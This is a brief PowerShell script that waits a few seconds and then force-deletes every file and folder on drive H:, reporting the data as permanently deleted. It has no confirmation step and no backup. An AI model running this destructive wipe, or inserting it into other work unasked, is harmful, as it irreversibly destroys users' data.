param (
    [int]$delaySeconds = 5
)

$driveLetter = "H:"

# Start a timer for the delay
Start-Sleep -Seconds $delaySeconds

# Check if the specified drive exists
if (Test-Path $driveLetter -PathType Container) {
    # Delete all files and folders from the drive
    Get-ChildItem -Path $driveLetter -Force | Remove-Item -Force -Recurse
    Write-Output "Data on drive $driveLetter has been permanently deleted."
} else {
    Write-Output "Drive $driveLetter does not exist or is not accessible."
}
